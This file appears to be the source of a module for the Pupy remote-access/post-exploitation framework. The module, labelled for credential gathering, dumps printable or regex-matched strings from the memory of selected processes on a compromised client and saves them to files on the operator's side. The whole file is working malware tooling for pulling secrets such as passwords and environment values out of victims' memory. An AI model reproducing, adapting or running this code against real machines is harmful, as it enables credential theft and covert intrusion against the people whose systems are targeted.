# -*- coding: utf-8 -*-

import os

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.utils.rpyc_utils import obtain

__class_name__="MemStrings"

@config(cat="creds", compat=["windows", "linux", "solaris"])
class MemStrings(PupyModule):
    """
        Dump printable strings from process memory for futher analysis
    """
    dependencies=['memorpy', 'memstrings']

    termevent = None

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='memstrings', description=cls.__doc__)
        action = cls.arg_parser.add_mutually_exclusive_group(required=True)
        action.add_argument('-p', '--pid', nargs='*', type=int, default=[],
                                help='Include processes with specified pids')
        action.add_argument('-n', '--name', nargs='*', default=[],
                                help='Include processes with specified names')
        cls.arg_parser.add_argument('-x', '--omit', type=str, default='isrx',
                                help='Avoid scanning: '
                                'i - ranges with file mapping; '
                                's - ranges with shared region; '
                                'x - ranges with executable region; '
                                'r - ranges with read-only region')

        regex = cls.arg_parser.add_mutually_exclusive_group()
        regex.add_argument('-r', '--regex', type=str,
                           help='Regex to match (default: printable strings). '
                               'Example: "^[a-zA-Z_]+=[\\x20-\\x7e]+$" - env strings')

        maxmin = regex.add_argument_group()
        maxmin.add_argument('-l', '--min-length', type=int, default=4,
                                help='Show only strings which are longer then specified length')
        maxmin.add_argument('-m', '--max-length', type=int, default=51,
                                help='Show only strings which are shorter then specified length')

        cls.arg_parser.add_argument('-P', '--portions', type=int, default=8192,
                                help='Strings portion block')
        cls.arg_parser.add_argument('-d', '--no-duplication', default=False, action='store_true',
                                help='Enable strings deduplication (will increase memory usage)')
        cls.arg_parser.add_argument('-S', '--stdout', action='store_true', help='Show strings on stdout')

    def run(self, args):
        targets = args.pid + args.name

        REvent = self.client.remote('threading', 'Event', False)
        iterate_strings = self.client.remote('memstrings', 'iterate_strings', False)

        self.termevent = REvent()

        last_pid = None
        last_log = None

        config = self.client.pupsrv.config

        for pid, name, strings in iterate_strings(
                targets,
                args.regex,
                min_length=args.min_length,
                max_length=args.max_length,
                omit=args.omit,
                portions=args.portions,
                terminate=self.termevent,
                nodup=args.no_duplication,
        ):

            strings = obtain(strings)
            pid = str(pid) or '0'
            name = str(name) or ''

            if not strings:
                self.error('No dumps received')
                return

            if args.stdout:
                self.success('Strings {}:{}'.format(name, pid))
                for s in strings:
                    self.log(s)
            else:
                if last_pid != pid:
                    last_pid = pid
                    if last_log:
                        last_log.close()

                    try:
                        folder = config.get_folder('memstrings', {'%c': self.client.short_name()})
                        path = name.replace('!','!!').replace('/', '!').replace('\\', '!')
                        path = os.path.join(folder, '{}.{}.strings'.format(path, pid))
                        last_log = open(path, 'w+')
                        self.success('{} {} -> {}'.format(name, pid, path))

                    except Exception as e:
                        self.error('{} {}: {}'.format(name, pid, e))

                for s in strings:
                    last_log.write(s+'\n')

                last_log.flush()

        if last_log:
            last_log.close()

    def interrupt(self):
        if self.termevent:
            self.termevent.set()
